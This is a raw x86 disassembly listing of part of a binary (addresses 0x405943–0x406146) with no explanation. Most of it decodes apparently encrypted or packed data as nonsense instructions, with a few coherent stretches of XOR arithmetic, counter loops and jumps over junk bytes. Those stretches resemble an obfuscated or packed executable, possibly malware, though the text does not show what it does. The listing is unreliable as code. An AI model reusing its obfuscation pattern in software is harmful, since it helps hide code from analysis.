  405943:	mov    edi,0x8e7e8545
  405948:	test   DWORD PTR [eax],esp
  40594a:	pop    es
  40594b:	cld    
  40594c:	push   ds
  40594d:	sbb    eax,0x2240f830
  405952:	adc    ebp,ebx
  405954:	push   0xe6cfaeef
  405959:	jbe    0x405995
  40595b:	pop    ss
  40595c:	enter  0xd05c,0x1
  405960:	or     DWORD PTR [ebx+0x7d08e2b4],edx
  405966:	(bad)  
  405967:	fcomp  QWORD PTR [eax-0x599bf111]
  40596d:	mov    ecx,0x79fa133a
  405972:	shl    BYTE PTR [edx],0xe8
  405975:	xchg   ecx,eax
  405976:	inc    ebx
  405977:	cmp    BYTE PTR ds:0x7d6d6afb,0x8f
  40597e:	xchg   edi,eax
  40597f:	jno    0x405945
  405981:	inc    esi
  405982:	je     0x4059be
  405984:	push   ds
  405985:	pop    edx
  405986:	jno    0x40594b
  405988:	js     0x40590e
  40598a:	push   ss
  40598b:	out    dx,al
  40598c:	jo     0x405929
  40598e:	test   al,0xa3
  405990:	mov    ebx,ecx
  405992:	dec    edx
  405993:	mov    BYTE PTR [edx+edi*1+0x5f],bh
  405997:	pop    edi
  405998:	ja     0x405985
  40599a:	inc    ebx
  40599b:	mov    edi,DWORD PTR [ebp-0x47]
  40599e:	into   
  40599f:	jmp    0x7f02:0x29d38bc6
  4059a6:	mov    ebp,0xc47c9282
  4059ab:	pop    edx
  4059ac:	add    al,0x3b
  4059ae:	stos   BYTE PTR es:[edi],al
  4059af:	inc    ebp
  4059b0:	or     al,0xf2
  4059b2:	gs rcl ah,cl
  4059b5:	push   edx
  4059b6:	pop    esp
  4059b7:	es jl  0x4059c6
  4059ba:	loope  0x40598e
  4059bc:	jle    0x405975
  4059be:	mov    esp,esi
  4059c0:	pop    esi
  4059c1:	fist   DWORD PTR [ebx-0x1b09c6fd]
  4059c7:	out    0xd5,al
  4059c9:	push   esp
  4059ca:	inc    ebx
  4059cb:	or     dh,BYTE PTR [ebp+0x610969a6]
  4059d1:	inc    esp
  4059d2:	jns    0x405a2d
  4059d4:	int    0x28
  4059d6:	outs   dx,BYTE PTR ds:[esi]
  4059d7:	outs   dx,DWORD PTR ds:[esi]
  4059d8:	lods   al,BYTE PTR ds:[esi]
  4059d9:	out    0xb6,al
  4059db:	out    dx,eax
  4059dc:	cli    
  4059dd:	out    0x93,eax
  4059df:	cmp    cl,BYTE PTR [ebp+0x53]
  4059e2:	mov    DWORD PTR [ebx+0x71],esi
  4059e5:	mov    DWORD PTR [ebx-0x678cad42],eax
  4059eb:	mov    BYTE PTR [ebp-0x689101d7],ah
  4059f1:	stos   BYTE PTR es:[edi],al
  4059f2:	fucomip st,st(6)
  4059f4:	lods   al,BYTE PTR ds:[esi]
  4059f5:	or     al,0xf5
  4059f7:	mov    edx,0xe5cf4a3c
  4059fc:	lock jb 0x405a4c
  4059ff:	mov    cl,0xec
  405a01:	sar    BYTE PTR [ebp-0x1f1c39b],0x6b
  405a08:	jle    0x4059b0
  405a0a:	stos   DWORD PTR es:[edi],eax
  405a0b:	add    ebp,DWORD PTR cs:[esp+ebx*4]
  405a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a10:	and    DWORD PTR [eax+0x62],ebp
  405a13:	cmp    al,0x49
  405a15:	lock jge 0x405a19
  405a18:	out    0xc1,eax
  405a1a:	mov    esp,0xef3f98ea
  405a1f:	add    edx,ecx
  405a21:	sub    al,0x17
  405a23:	lahf   
  405a24:	sbb    ebx,edi
  405a26:	(bad)  
  405a27:	cld    
  405a28:	mov    ds:0xfe991b9e,al
  405a2d:	add    al,0x51
  405a2f:	jne    0x405a7d
  405a31:	int    0xc7
  405a33:	inc    ebp
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43355b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43366f
  405a48:	xor    DWORD PTR ds:0x433543,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433667,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43353f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43361b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43361b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43361b,ecx
  405a80:	cmp    DWORD PTR ds:0x43361b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43361b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43357b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433657,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x914d28f4,0x4656951d
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405b04
  405add:	fwait
  405ade:	sub    al,0xbf
  405ae0:	sbb    DWORD PTR [esi+0x4990a2ca],edi
  405ae6:	cmp    BYTE PTR ds:0xa2f3851e,cl
  405aec:	das    
  405aed:	js     0x405b6b
  405aef:	call   0x11665eb9
  405af4:	test   DWORD PTR [ebx+0x30],0x22b8e74b
  405afb:	or     eax,0x79cf5c90
  405b00:	push   edx
  405b01:	mov    esp,0x1318f508
  405b06:	sub    bh,BYTE PTR [ecx+0x3d7d65d6]
  405b0c:	pop    ds
  405b0d:	mov    cl,0xd5
  405b0f:	mov    fs,WORD PTR [edi]
  405b11:	stc    
  405b12:	lods   al,BYTE PTR ds:[esi]
  405b13:	clc    
  405b14:	mov    edi,0x7bfa4b9c
  405b19:	outs   dx,DWORD PTR ds:[esi]
  405b1a:	cwde   
  405b1b:	mov    eax,ds:0x495e4435
  405b20:	in     al,dx
  405b21:	push   ebp
  405b22:	xor    ebx,ebx
  405b24:	cmp    DWORD PTR [ebp+0x9],edx
  405b27:	into   
  405b28:	int    0x55
  405b2a:	add    ecx,esp
  405b2c:	cmp    DWORD PTR [eax+0x75],0xffffffd1
  405b30:	sbb    dh,bh
  405b32:	fisttp DWORD PTR [edx+0x55887d98]
  405b38:	lahf   
  405b39:	push   esp
  405b3a:	ins    BYTE PTR es:[edi],dx
  405b3b:	lods   eax,DWORD PTR ds:[esi]
  405b3c:	pusha  
  405b3d:	nop
  405b3e:	mov    ecx,0x1596b99f
  405b43:	das    
  405b44:	push   ebx
  405b45:	xchg   edi,eax
  405b46:	mov    BYTE PTR [ecx],0x2a
  405b49:	mov    BYTE PTR [eax-0x71ab6424],ch
  405b4f:	call   DWORD PTR [edi]
  405b51:	aam    0xd
  405b53:	stos   BYTE PTR es:[edi],al
  405b54:	mov    WORD PTR [esi],?
  405b56:	jecxz  0x405bca
  405b58:	dec    esp
  405b59:	ret    
  405b5a:	and    DWORD PTR [ecx+0x4f],esi
  405b5d:	repnz ror BYTE PTR [esi+0x20b3b765],0x9e
  405b65:	(bad)  
  405b66:	rol    dh,1
  405b68:	inc    edi
  405b69:	dec    ecx
  405b6a:	push   edi
  405b6b:	cli    
  405b6c:	(bad)  
  405b6d:	pop    edi
  405b6e:	xchg   ebx,eax
  405b6f:	inc    ebx
  405b70:	test   eax,0x5b0ddda8
  405b75:	inc    ebp
  405b76:	jnp    0x405bf6
  405b78:	pop    es
  405b79:	xor    DWORD PTR [ebp+ebp*1-0x72],ecx
  405b7d:	dec    eax
  405b7e:	ret    
  405b7f:	(bad)  
  405b80:	clc    
  405b81:	xor    esp,esi
  405b83:	push   0xafa5bf3c
  405b88:	dec    ecx
  405b89:	int3   
  405b8a:	pop    ds
  405b8b:	add    BYTE PTR [eax+0x35],al
  405b8e:	(bad)  
  405b8f:	popf   
  405b90:	cli    
  405b91:	xor    DWORD PTR [ecx],esp
  405b93:	push   cs
  405b94:	and    eax,0xd5eda5df
  405b99:	ins    BYTE PTR es:[edi],dx
  405b9a:	(bad)  
  405b9b:	popf   
  405b9c:	fdivrp st(5),st
  405b9e:	cmp    bh,BYTE PTR [ecx-0x8]
  405ba1:	add    ah,cl
  405ba3:	(bad)  
  405ba4:	out    dx,al
  405ba5:	or     ebp,DWORD PTR [esi+0x1482d8bf]
  405bab:	adc    BYTE PTR [edi-0x3f],cl
  405bae:	or     ch,BYTE PTR [ebp-0x69]
  405bb1:	fidivr WORD PTR [esi-0x50870ee3]
  405bb7:	xor    DWORD PTR [ecx+edx*4],esp
  405bba:	mov    ch,0x84
  405bbc:	ds fwait
  405bbe:	arpl   si,bp
  405bc0:	or     ebp,DWORD PTR [eax]
  405bc2:	ja     0x405bf9
  405bc4:	xor    al,0x1f
  405bc6:	out    0xfd,al
  405bc8:	mov    dh,0x8c
  405bca:	cmc    
  405bcb:	rcr    DWORD PTR [ebx+0x6927812d],0x1e
  405bd2:	or     ecx,DWORD PTR [eax-0x36072704]
  405bd8:	adc    eax,0xd1891755
  405bdd:	mov    ebx,0x3d731b4e
  405be2:	jns    0x405be7
  405be4:	or     ebp,ecx
  405be6:	push   0x729d0f65
  405beb:	mov    esp,0x12edba15
  405bf0:	lea    edi,[edx-0x697038de]
  405bf6:	cmp    esp,DWORD PTR [eiz*2-0x5b1c1099]
  405bfd:	adc    eax,ebp
  405bff:	dec    eax
  405c00:	jp     0x405bd3
  405c02:	mov    ecx,0xe94fef77
  405c07:	xchg   ecx,eax
  405c08:	lahf   
  405c09:	loope  0x405c7d
  405c0b:	jnp    0x405c5b
  405c0d:	dec    si
  405c0f:	mov    bl,0xcc
  405c11:	sbb    BYTE PTR [esi-0x1d],0x8f
  405c15:	pop    ecx
  405c16:	mov    dh,0xb8
  405c18:	and    BYTE PTR [ebp+0x51de573],ah
  405c1e:	es ja  0x405c6f
  405c21:	mov    ebx,0x2533b91a
  405c26:	or     BYTE PTR [ebx-0x3e3bd91f],dh
  405c2c:	ss dec ecx
  405c2e:	icebp  
  405c2f:	mov    ch,0x93
  405c31:	mov    bl,0x85
  405c33:	push   edx
  405c34:	mov    dh,0x65
  405c36:	lahf   
  405c37:	add    al,0x5d
  405c39:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c3b:	and    bl,BYTE PTR [ebx]
  405c3d:	cmp    esp,ebp
  405c3f:	cmp    bl,bh
  405c41:	sbb    esp,DWORD PTR [eax-0x33]
  405c44:	loopne 0x405bd3
  405c46:	push   es
  405c47:	pop    esi
  405c48:	jns    0x405bf0
  405c4a:	push   ecx
  405c4b:	cld    
  405c4c:	in     eax,0x72
  405c4e:	mov    ah,0x7a
  405c50:	adc    eax,0xab1186a8
  405c55:	loop   0x405c0a
  405c57:	lods   eax,DWORD PTR ds:[esi]
  405c58:	inc    ebx
  405c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c5a:	icebp  
  405c5b:	pusha  
  405c5c:	mov    ah,0xf1
  405c5e:	aad    0xfe
  405c60:	scas   al,BYTE PTR es:[edi]
  405c61:	xlat   BYTE PTR ds:[ebx]
  405c62:	mov    fs,WORD PTR [edi+0x28]
  405c65:	push   es
  405c66:	rcl    DWORD PTR [eax-0x7d1dc5bb],cl
  405c6c:	adc    eax,DWORD PTR [ebx+0x6]
  405c6f:	xor    DWORD PTR [eax],eax
  405c71:	mov    ch,BYTE PTR [ebx+0x1d]
  405c74:	sbb    eax,0xb2ef959f
  405c79:	mov    dl,0xf0
  405c7c:	add    edi,eax
  405c7e:	xchg   ebp,eax
  405c7f:	xor    BYTE PTR [eax-0x7d],dh
  405c82:	cmp    ebx,DWORD PTR [edx]
  405c84:	ins    DWORD PTR es:[edi],dx
  405c85:	push   es
  405c86:	xchg   esp,eax
  405c87:	cmp    bh,cl
  405c89:	ret    0x619
  405c8c:	loope  0x405c37
  405c8e:	mov    eax,ds:0xf95c110d
  405c93:	sub    eax,0x2755a1d4
  405c98:	and    eax,0x6d6699e
  405c9d:	sbb    eax,DWORD PTR [edx+0x10]
  405ca0:	sbb    al,0x5e
  405ca2:	mov    bh,0x9
  405ca4:	xor    al,0x20
  405ca6:	sub    DWORD PTR [ebx-0x5f],ebp
  405ca9:	lock pop eax
  405cab:	push   ds
  405cac:	popf   
  405cad:	mov    dh,0xf8
  405caf:	push   ss
  405cb0:	xchg   esi,eax
  405cb1:	adc    ecx,edi
  405cb3:	pop    esp
  405cb4:	mov    ds:0x3c951d99,al
  405cb9:	retf   0xb2cb
  405cbc:	(bad)
  405cbf:	sbb    eax,0xe79c84de
  405cc4:	stos   DWORD PTR es:[edi],eax
  405cc5:	inc    eax
  405cc6:	mov    ds:0xf70d35ff,al
  405ccb:	lds    edi,FWORD PTR [eax-0x24ac0c96]
  405cd1:	xchg   ebx,eax
  405cd2:	dec    eax
  405cd3:	xlat   BYTE PTR ds:[ebx]
  405cd4:	mov    esi,0x133c714f
  405cd9:	fucomp st(3)
  405cdb:	out    dx,eax
  405cdc:	cmp    esp,ebp
  405cde:	je     0x405d1f
  405ce0:	aad    0xb4
  405ce2:	mov    dh,0x30
  405ce4:	arpl   si,cx
  405ce6:	mov    WORD PTR [ecx],fs
  405ce8:	xchg   BYTE PTR [eax-0x6e],cl
  405ceb:	xchg   edx,eax
  405cec:	jnp    0x405ca0
  405cee:	push   ds
  405cef:	iret   
  405cf0:	mov    dl,0x62
  405cf2:	(bad)
  405cf7:	add    eax,0x623246aa
  405cfc:	jb     0x405ce1
  405cfe:	pusha  
  405cff:	addr16 cmp eax,0xa7c8fbf
  405d05:	push   ss
  405d06:	adc    al,0x43
  405d08:	add    eax,0xa1dcfd98
  405d0d:	dec    edx
  405d0e:	xlat   BYTE PTR ds:[ebx]
  405d0f:	push   0x5e9ff890
  405d14:	test   al,0xc0
  405d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d17:	mov    edi,0xcca73e41
  405d1c:	cmp    BYTE PTR [edi],al
  405d1e:	and    DWORD PTR [edi-0x75ca46df],0xffffffc2
  405d25:	and    ebx,DWORD PTR [ebx-0x43ec29f4]
  405d2b:	xor    DWORD PTR [ecx],ebp
  405d2d:	test   al,0x5c
  405d2f:	pop    eax
  405d30:	jmp    0x405d7e
  405d32:	sbb    ebx,DWORD PTR [esi]
  405d34:	std    
  405d35:	mov    ah,0xeb
  405d37:	pusha  
  405d38:	cdq    
  405d39:	ret    
  405d3a:	out    dx,al
  405d3b:	lods   eax,DWORD PTR ds:[esi]
  405d3c:	lods   al,BYTE PTR ds:[esi]
  405d3d:	mov    al,BYTE PTR [ebx-0x4293ee69]
  405d43:	ins    BYTE PTR es:[edi],dx
  405d44:	rcl    eax,0x9a
  405d47:	ret    0x6d93
  405d4a:	xor    dl,cl
  405d4c:	(bad)  
  405d4d:	in     eax,0x43
  405d4f:	add    DWORD PTR [ebp+0x75754bdf],ebp
  405d55:	ud1    esi,DWORD PTR [ecx-0x6e]
  405d59:	outs   dx,DWORD PTR ds:[esi]
  405d5a:	jp     0x405dd6
  405d5c:	sbb    eax,0x7f98b82
  405d61:	ja     0x405d9a
  405d63:	jecxz  0x405d54
  405d65:	scas   al,BYTE PTR es:[edi]
  405d66:	cmp    dl,BYTE PTR [eax-0x5e]
  405d69:	sti    
  405d6a:	jo     0x405d43
  405d6c:	ins    DWORD PTR es:[edi],dx
  405d6d:	push   ds
  405d6e:	mov    DWORD PTR [edx+0x22],ecx
  405d71:	xor    BYTE PTR [ebx],dh
  405d73:	repnz pop ebx
  405d75:	aad    0x9c
  405d77:	mov    ebx,0xeeb465ec
  405d7c:	in     al,dx
  405d7d:	sbb    eax,0xe7be5837
  405d82:	js     0x405dc5
  405d84:	jmp    0x521:0x8f683548
  405d8b:	pusha  
  405d8c:	dec    ebx
  405d8d:	push   ecx
  405d8e:	jne    0x405d5c
  405d90:	out    0xe,al
  405d92:	mov    dh,0x84
  405d94:	shr    DWORD PTR [edi-0x39fbdae2],cl
  405d9a:	dec    ebp
  405d9b:	inc    edx
  405d9c:	xchg   esp,eax
  405d9d:	sar    DWORD PTR [edx+0x641bf5ac],1
  405da3:	in     al,0x21
  405da5:	fdiv   st,st(2)
  405da7:	mov    cl,0x3a
  405da9:	xchg   ebp,eax
  405daa:	xor    bh,BYTE PTR [edi-0x41110816]
  405db0:	xchg   ecx,eax
  405db1:	mov    BYTE PTR [eax+0x4786c6e7],dh
  405db7:	repz dec edi
  405db9:	not    BYTE PTR [ebp-0x117a69b2]
  405dbf:	loope  0x405d59
  405dc1:	cwde   
  405dc2:	dec    ebp
  405dc3:	aas    
  405dc4:	mov    al,ds:0xaf68fe89
  405dc9:	sub    ebx,esi
  405dcb:	xchg   DWORD PTR [esi],esp
  405dcd:	xchg   ecx,eax
  405dce:	xchg   esp,eax
  405dcf:	inc    ebx
  405dd0:	mov    eax,ds:0x448e9e63
  405dd5:	push   edi
  405dd6:	mov    ch,0xce
  405dd8:	xor    BYTE PTR [edi-0x2f9cc5e6],ah
  405dde:	fadd   QWORD PTR [edi-0x72479ec1]
  405de4:	xor    ecx,DWORD PTR [ecx-0x4d423c86]
  405dea:	inc    eax
  405deb:	sbb    BYTE PTR [eax-0x7f389350],al
  405df1:	scas   eax,DWORD PTR es:[edi]
  405df2:	cwde   
  405df3:	mov    BYTE PTR [esi+0x3b],0x69
  405df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df8:	sbb    ecx,ebp
  405dfa:	push   ebx
  405dfb:	xlat   BYTE PTR ds:[ebx]
  405dfc:	jmp    0xc006:0x23eabb50
  405e03:	in     eax,dx
  405e04:	mov    ebp,0x7c00b36d
  405e09:	aaa    
  405e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0b:	sbb    al,0x5d
  405e0d:	mov    dh,0x29
  405e0f:	std    
  405e10:	jne    0x405d96
  405e12:	sbb    BYTE PTR [edi],bh
  405e14:	mov    cl,0x2b
  405e16:	push   edi
  405e17:	jl     0x405df8
  405e19:	push   edi
  405e1a:	retf   0xe7ea
  405e1d:	sbb    BYTE PTR [eax-0x69],dh
  405e20:	mov    ecx,0xe2712e7b
  405e25:	sar    DWORD PTR [edx],0xb3
  405e28:	push   0x4cdbcecf
  405e2d:	mov    eax,0x191150da
  405e32:	das    
  405e33:	mov    al,ds:0x7cc70d33
  405e38:	cld    
  405e39:	push   edx
  405e3a:	dec    ebp
  405e3b:	fadd   DWORD PTR [ecx-0x6f]
  405e3e:	jae    0x405e33
  405e40:	lahf   
  405e41:	popa   
  405e42:	inc    edi
  405e43:	inc    ebp
  405e44:	in     al,0x1f
  405e46:	push   eax
  405e47:	mov    ah,0x0
  405e49:	call   0x9f0d:0x170769cc
  405e50:	xor    edx,DWORD PTR [ecx+eiz*8]
  405e53:	ror    DWORD PTR [edx+eax*2+0x1d],1
  405e57:	inc    edi
  405e58:	or     eax,0xd8212fad
  405e5d:	xchg   ebp,eax
  405e5e:	(bad)  
  405e5f:	aas    
  405e60:	pop    ds
  405e61:	xchg   ebp,eax
  405e62:	inc    esi
  405e63:	jge    0x405e9b
  405e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e66:	int    0xd4
  405e68:	mov    bl,0x5a
  405e6a:	outs   dx,DWORD PTR ds:[esi]
  405e6b:	pop    ds
  405e6c:	out    dx,al
  405e6d:	and    DWORD PTR [ecx],ecx
  405e6f:	pop    esp
  405e70:	jmp    0xaee7f84d
  405e75:	gs and al,0x48
  405e78:	add    BYTE PTR [ecx+ebp*4-0x66bdb102],al
  405e7f:	shl    DWORD PTR [edx],0x93
  405e82:	xchg   ebx,eax
  405e83:	push   ebp
  405e84:	and    ebx,DWORD PTR [esi+0x6cb926bd]
  405e8a:	(bad)  
  405e8b:	xchg   ebp,eax
  405e8c:	ror    DWORD PTR [ebx-0x2a],cl
  405e8f:	sub    al,0xba
  405e91:	test   BYTE PTR [edx],ch
  405e93:	add    eax,ecx
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x67d750a5
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	xor    DWORD PTR [eax-0x5c3f8668],esp
  405ee8:	cs sbb al,0xce
  405eeb:	out    0x9,eax
  405eed:	hlt    
  405eee:	pop    edi
  405eef:	loopne 0x405e77
  405ef1:	mov    edx,0x2c0288c8
  405ef6:	cmp    ebp,DWORD PTR [eax-0x52]
  405ef9:	(bad)  
  405efa:	cmp    bh,ch
  405efc:	xchg   DWORD PTR [ecx+edi*1+0x3f15e05e],ecx
  405f03:	mov    edi,0x8f5d49ba
  405f08:	loope  0x405edd
  405f0a:	lds    edx,FWORD PTR [ecx-0x12ad411]
  405f10:	push   ss
  405f11:	fstp   TBYTE PTR [edi-0x41]
  405f14:	cmp    eax,0x30ea85e2
  405f19:	in     al,0x2
  405f1b:	inc    ecx
  405f1c:	sbb    DWORD PTR ds:0x19547592,edx
  405f22:	(bad)
  405f26:	inc    ecx
  405f27:	cmc    
  405f28:	mov    dl,BYTE PTR [ebp-0x3c4c45f6]
  405f2e:	stc    
  405f2f:	push   ebp
  405f30:	stc    
  405f31:	push   eax
  405f32:	(bad)  
  405f33:	cmp    esp,DWORD PTR [ecx-0x3fc14a6]
  405f39:	sti    
  405f3a:	sbb    BYTE PTR [edx],dl
  405f3c:	or     ah,bh
  405f3e:	pusha  
  405f3f:	les    ecx,FWORD PTR [eax]
  405f41:	loop   0x405fc0
  405f43:	sbb    ecx,DWORD PTR [esi+0x67]
  405f46:	daa    
  405f47:	or     al,0x72
  405f49:	pop    ebx
  405f4a:	ins    DWORD PTR es:[edi],dx
  405f4b:	and    ecx,eax
  405f4d:	or     edi,ecx
  405f4f:	sub    al,0x95
  405f51:	das    
  405f52:	xor    eax,0x7b742139
  405f57:	pop    esi
  405f58:	stos   DWORD PTR es:[edi],eax
  405f59:	mov    edx,0xf601f086
  405f5e:	outs   dx,BYTE PTR ds:[esi]
  405f5f:	outs   dx,BYTE PTR ds:[esi]
  405f60:	mov    ebp,0xf46a5019
  405f65:	aad    0x4e
  405f67:	lock aam 0x2f
  405f6a:	mov    eax,0xb4e4f603
  405f6f:	push   edi
  405f70:	mov    eax,fs:0xad385845
  405f76:	mov    ecx,0x6eac7775
  405f7b:	push   edx
  405f7c:	test   al,0xbe
  405f7e:	in     eax,0x66
  405f80:	or     eax,0xe55efbd6
  405f85:	popa   
  405f86:	shr    BYTE PTR [ecx-0x60],1
  405f89:	jns    0x405f2b
  405f8b:	scas   al,BYTE PTR es:[edi]
  405f8c:	sbb    eax,0xd4330415
  405f91:	test   DWORD PTR [eax+0x13],0x2cfe4ee0
  405f98:	and    ah,dh
  405f9a:	test   eax,0x397dd786
  405f9f:	jo     0x405fd4
  405fa1:	inc    edi
  405fa2:	clc    
  405fa3:	ds mov ebx,0x3ee44
  405fa9:	push   ds
  405faa:	fsubr  DWORD PTR [ecx+0x6de681e7]
  405fb0:	mov    ebp,0x9b637cc8
  405fb5:	ss enter 0xdb1c,0x8
  405fba:	ficomp WORD PTR [edx-0x61]
  405fbd:	cs (bad) 
  405fbf:	cmp    eax,0x49d799ed
  405fc4:	pop    edi
  405fc5:	fbld   TBYTE PTR [ebx+0x165ed57f]
  405fcb:	add    ecx,edi
  405fcd:	in     eax,0xed
  405fcf:	pop    ds
  405fd0:	xchg   edi,eax
  405fd1:	call   0xad285d82
  405fd6:	cmp    bh,dh
  405fd8:	xchg   edx,eax
  405fd9:	sub    dl,BYTE PTR [esi-0xf]
  405fdc:	cli    
  405fdd:	std    
  405fde:	clc    
  405fdf:	inc    DWORD PTR [esi+0x4d]
  405fe2:	std    
  405fe3:	mov    ds:0x2e96034d,al
  405fe8:	lock js 0x405f71
  405feb:	jb     0x405ffc
  405fed:	jo     0x405fff
  405fef:	xchg   ebp,eax
  405ff0:	cmp    DWORD PTR [ebx-0x4ff1011c],0x8987916a
  405ffa:	push   ds
  405ffb:	sub    al,0x8e
  405ffd:	mov    ch,0x30
  405fff:	outs   dx,DWORD PTR ds:[esi]
  406000:	les    ebx,FWORD PTR [ebp+0x69]
  406003:	sbb    dh,BYTE PTR [ebx-0x16]
  406006:	imul   BYTE PTR [esi-0x1ade4bad]
  40600c:	cmc    
  40600d:	sbb    al,0x88
  40600f:	cli    
  406010:	repnz xor DWORD PTR [edx-0x2b4709d2],0xffffffea
  406018:	and    eax,0x2d04b99d
  40601d:	sub    BYTE PTR [eax-0x1],bh
  406020:	mov    esi,DWORD PTR [ebp-0xd]
  406023:	ficom  WORD PTR [ecx]
  406025:	mov    al,0x4c
  406027:	and    bh,BYTE PTR [esi+0x3f]
  40602a:	test   eax,0x969f50ca
  40602f:	das    
  406030:	inc    eax
  406031:	jae    0x40601f
  406033:	sub    edx,edx
  406035:	jnp    0x405fe2
  406037:	inc    ecx
  406038:	(bad)  
  406039:	loop   0x4060b8
  40603b:	mov    esp,0x52cb7812
  406040:	sahf   
  406041:	sub    al,0xdd
  406043:	pop    eax
  406044:	loope  0x406026
  406046:	adc    eax,0xae98b571
  40604b:	add    ebx,0x9fc20593
  406051:	jae    0x405fd3
  406053:	outs   dx,BYTE PTR ds:[esi]
  406054:	ja     0x40608e
  406056:	mov    ch,BYTE PTR [edi+0x7d]
  406059:	sub    eax,0x765baf95
  40605e:	dec    ecx
  40605f:	mov    BYTE PTR [eiz*8+0x16571b8c],ah
  406066:	shl    BYTE PTR [edi+0xd9075e2],0xee
  40606d:	int3   
  40606e:	add    esp,ebx
  406070:	stos   BYTE PTR es:[edi],al
  406071:	push   cs
  406072:	mov    eax,0xa164db1
  406077:	in     eax,dx
  406078:	adc    bl,BYTE PTR [edx+0x1fc93423]
  40607e:	jns    0x4060d4
  406080:	mov    ebp,0x6af1ce29
  406085:	or     esp,DWORD PTR [edx]
  406087:	sub    eax,0xa1044f0d
  40608c:	sti    
  40608d:	pushf  
  40608e:	(bad)  
  40608f:	jmp    0xdea:0x5ce3af2e
  406096:	sub    WORD PTR cs:[ecx],0xbb9c
  40609c:	jne    0x406040
  40609e:	cmc    
  40609f:	push   ss
  4060a0:	xchg   ebp,eax
  4060a1:	in     al,0xd5
  4060a3:	mov    dh,0x5d
  4060a5:	jbe    0x40604f
  4060a7:	mov    edx,0xf2bd6161
  4060ac:	dec    ebx
  4060ad:	cli    
  4060ae:	cli    
  4060af:	or     eax,0x57d71a5
  4060b4:	sub    eax,0xbb8c43ce
  4060ba:	sbb    al,0xd8
  4060bc:	aad    0x95
  4060be:	adc    esi,ebx
  4060c0:	out    0x56,al
  4060c2:	mov    bh,0x33
  4060c4:	enter  0xace,0x53
  4060c8:	clc    
  4060c9:	sbb    edi,ebp
  4060cb:	in     al,0x2b
  4060cd:	ja     0x40611b
  4060cf:	sub    edi,edi
  4060d1:	mov    ds:0x309e971d,eax
  4060d6:	fstp   TBYTE PTR [eax-0x6f]
  4060d9:	mov    esi,edx
  4060db:	(bad)  
  4060dc:	pop    DWORD PTR [esi-0x1a2b1e14]
  4060e2:	out    dx,eax
  4060e3:	test   eax,0x960be471
  4060e8:	scas   eax,DWORD PTR es:[edi]
  4060e9:	lahf   
  4060ea:	pop    ds
  4060eb:	xlat   BYTE PTR ds:[ebx]
  4060ec:	mov    eax,DWORD PTR [eax-0x71]
  4060ef:	adc    eax,edx
  4060f1:	cli    
  4060f2:	mov    ecx,0x16762c85
  4060f7:	mov    ds:0xa1ec607,eax
  4060fc:	retf   0xc8e6
  4060ff:	mov    eax,0xc2100f5c
  406104:	retf   
  406105:	sti    
  406106:	pop    esp
  406107:	rcl    DWORD PTR [ebp-0x31],cl
  40610a:	fcomp  DWORD PTR [ecx+0x59]
  40610d:	cmp    eax,0x8a146981
  406112:	repz int 0x8d
  406115:	mov    eax,0xfb29e7a4
  40611a:	xchg   ebp,eax
  40611b:	scas   al,BYTE PTR es:[edi]
  40611c:	pop    ds
  40611d:	fwait
  40611e:	aad    0xb
  406120:	add    eax,0xbb1bfa60
  406125:	xchg   esi,eax
  406126:	or     BYTE PTR [esi],0xb3
  406129:	es fwait
  40612b:	xchg   esp,eax
  40612c:	ror    DWORD PTR [edi+0x29],cl
  40612f:	rol    DWORD PTR [edx-0x69450c96],cl
  406135:	call   0x11e:0xa3caf85c
  40613c:	add    BYTE PTR [edi+eax*4+0x3],0x7f
  406141:	in     eax,0x79
  406143:	xor    edi,edi
  406145:	daa    
  406146:	xchg   esp,eax
